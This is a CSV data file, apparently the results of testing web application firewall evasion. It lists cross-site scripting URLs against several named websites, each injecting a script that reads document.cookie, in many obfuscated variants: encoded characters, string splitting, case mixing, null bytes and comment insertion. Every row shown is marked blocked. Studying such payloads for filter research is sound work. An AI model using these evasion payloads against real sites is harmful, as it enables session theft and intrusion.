status,label,executed,payload,family,base_i,name,algo,zip,target,lstm_success
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script>alert(document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,"http://www.podzem.ru/send.php?f_feedbackname=<script>/drfv/
alert(document.cookie);</script>",diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script>alert`document.cookie`;</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script>alert(document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script>alert(document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script>alert(document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script>alert(document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script>top['al'+'ert'](document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script>top[8680439..toString(30)](document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=search?q=ok <script>alert(document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script <!--x-->>alert(document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script>alert(document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=%00<script>alert(document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script>top[/al/.source+/ert/.source](document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>alert(document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>alert(document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>alert(document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>alert(document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<SCRipT>alert(document.cookie);</sCRIPT>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>alert(document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>alert(document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>alert(document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script><script>alert(document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,//www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>alert(document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>alert(document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>alert(document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,"http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>/drfv/
alert(document.cookie);</script>",diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>alert`document.cookie`;</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>alert(document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>alert(document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>alert(document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>alert(document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>top['al'+'ert'](document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>top[8680439..toString(30)](document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=search?q=ok <script>alert(document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script <!--x-->>alert(document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>alert(document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script%00>alert(document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,http://www.realtimeworlds.com/index.php?id=4&pid=4&nid=<script>top[/al/.source+/ert/.source](document.cookie);</script>,diverse_table2,20.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script>alert(document.cookie);</script>&b=lp168""><script>alert(document.cookie);</script><e=all""><script>alert(document.cookie);</script>&subid=ftr ty""><script>alert(document.cookie);</script>",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script>alert(document.cookie);</script>&b=lp168""><script>alert(document.cookie);</script><e=all""><script>alert(document.cookie);</script>&subid=ftr ty""><script>alert(document.cookie);</script>",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script>alert(document.cookie);</script>&b=lp168""><script>alert(document.cookie);</script><e=all""><script>alert(document.cookie);</script>&subid=ftr ty""><script>alert(document.cookie);</script>",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script>alert(document.cookie);</script>&b=lp168""><script>alert(document.cookie);</script><e=all""><script>alert(document.cookie);</script>&subid=ftr%0Dty""><script>alert(document.cookie);</script>",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><scrIPT>alert(document.cookie);</scRiPT>&b=lp168""><Script>alert(document.cookie);</scRiPT><e=all""><scRIPt>alert(document.cookie);</scRiPT>&subid=ftr ty""><SCript>alert(document.cookie);</SCRiPT>",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script>alert(document.cookie);</script>&b=lp168""><script>alert(document.cookie);</script><e=all""><script>alert(document.cookie);</script>&subid=ftr ty""><script>alert(document.cookie);</script>",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script>alert(document.cookie);</script>&b=lp168""><script>alert(document.cookie);</script><e=all""><script>alert(document.cookie);</script>&subid=ftr ty""><script>alert(document.cookie);</script>",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script>alert(document.cookie);</script>&b=lp168""><script>alert(document.cookie);</script><e=all""><script>alert(document.cookie);</script>&subid=ftr ty""><script>alert(document.cookie);</script>",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>&b=lp168""><script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script><e=all""><script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>&subid=ftr ty""><script>&#x61;&#x6c;&#x6",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script><script>alert(document.cookie);</script>&b=lp168""><script>alert(document.cookie);</script><e=all""><script>alert(document.cookie);</script>&subid=ftr ty""><script>alert(document.cookie);</script>",diverse_table2,21.0,,,,,
403,BLOCK,False,"//www.gofreecredit.com/report.php?id=9915""><script>alert(document.cookie);</script>&b=lp168""><script>alert(document.cookie);</script><e=all""><script>alert(document.cookie);</script>&subid=ftr ty""><script>alert(document.cookie);</script>",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>&b=lp168""><script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script><e=all""><script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>&subid=ftr ty""><script>&#97;&#108;&#101;&#",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script>alert(document.cookie);</script>&b=lp168""><script>alert(document.cookie);</script><e=all""><script>alert(document.cookie);</script>&subid=ftr ty""><script>alert(document.cookie);</script>",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script>alert(document.cookie);</script>&b=lp168""><script>alert(document.cookie);</script><e=all""><script>alert(document.cookie);</script>&subid=ftr ty""><script>alert(document.cookie);</script>",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script>/drfv/
alert(document.cookie);</script>&b=lp168""><script>alert(document.cookie);</script><e=all""><script>alert(document.cookie);</script>&subid=ftr ty""><script>alert(document.cookie);</script>",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script>alert`document.cookie`;</script>&b=lp168""><script>alert`document.cookie`;</script><e=all""><script>alert`document.cookie`;</script>&subid=ftr ty""><script>alert`document.cookie`;</script>",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script>alert(document.cookie);</script>&b=lp168""><script>alert(document.cookie);</script><e=all""><script>alert(document.cookie);</script>&subid=ftr ty""><script>alert(document.cookie);</script>",diverse_table2,21.0,,,,,
403,BLOCK,False,http://www.gofreecredit.com/report.php?id=9915><script>alert(document.cookie);</script>&b=lp168><script>alert(document.cookie);</script><e=all><script>alert(document.cookie);</script>&subid=ftr ty><script>alert(document.cookie);</script>,diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>&b=lp168""><script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script><e=all""><script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>&subid=ftr ty""><script>\u0061\u006c\u00",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script>alert(document.cookie);</script>&b=lp168""><script>alert(document.cookie);</script><e=all""><script>alert(document.cookie);</script>&subid=ftr ty""><script>alert(document.cookie);</script>",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script>alert(document.cookie);</script>&b=lp168""><script>alert(document.cookie);</script><e=all""><script>alert(document.cookie);</script>&subid=ftr ty""><script>alert(document.cookie);</script>",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script>top['al'+'ert'](document.cookie);</script>&b=lp168""><script>top['al'+'ert'](document.cookie);</script><e=all""><script>top['al'+'ert'](document.cookie);</script>&subid=ftr ty""><script>top['al'+'ert'](document.cookie);</script>",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script>top[8680439..toString(30)](document.cookie);</script>&b=lp168""><script>top[8680439..toString(30)](document.cookie);</script><e=all""><script>top[8680439..toString(30)](document.cookie);</script>&subid=ftr ty""><script>top[8680439..toString(30)](d",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915"">search?q=ok <script>alert(document.cookie);</script>&b=lp168""><script>alert(document.cookie);</script><e=all""><script>alert(document.cookie);</script>&subid=ftr ty""><script>alert(document.cookie);</script>",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script <!--x-->>alert(document.cookie);</script>&b=lp168""><script>alert(document.cookie);</script><e=all""><script>alert(document.cookie);</script>&subid=ftr ty""><script>alert(document.cookie);</script>",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script>alert(document.cookie);</script>&b=lp168""><script>alert(document.cookie);</script><e=all""><script>alert(document.cookie);</script>&subid=ftr ty""><script>alert(document.cookie);</script>",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script%00>alert(document.cookie);</script>&b=lp168""><script>alert(document.cookie);</script><e=all""><script>alert(document.cookie);</script>&subid=ftr ty""><script>alert(document.cookie);</script>",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://www.gofreecredit.com/report.php?id=9915""><script>top[/al/.source+/ert/.source](document.cookie);</script>&b=lp168""><script>top[/al/.source+/ert/.source](document.cookie);</script><e=all""><script>top[/al/.source+/ert/.source](document.cookie);</script>&subid=ftr ty""><script>top[/al/.source+/er",diverse_table2,21.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><script>alert(document.cookie);</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><script>alert(document.cookie);</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><script>alert(document.cookie);</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><script>alert(document.cookie);</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><SCript>alert(document.cookie);</SCriPT>",diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><script>alert(document.cookie);</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><script>alert(document.cookie);</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><script>alert(document.cookie);</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><script><script>alert(document.cookie);</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,"//kone-liga.ru/search/?q=""><script>alert(document.cookie);</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><script>alert(document.cookie);</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><script>alert(document.cookie);</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><script>/drfv/
alert(document.cookie);</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><script>alert`document.cookie`;</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><script>alert(document.cookie);</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,http://kone-liga.ru/search/?q=><script>alert(document.cookie);</script>,diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><script>alert(document.cookie);</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><script>alert(document.cookie);</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><script>top['al'+'ert'](document.cookie);</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><script>top[8680439..toString(30)](document.cookie);</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q="">search?q=ok <script>alert(document.cookie);</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><script <!--x-->>alert(document.cookie);</script>",diverse_table2,22.0,,,,,
403,BLOCK,False,"http://kone-liga.ru/search/?q=""><script>alert(document.cookie);</script>",diverse_table2,22.0,,,,,
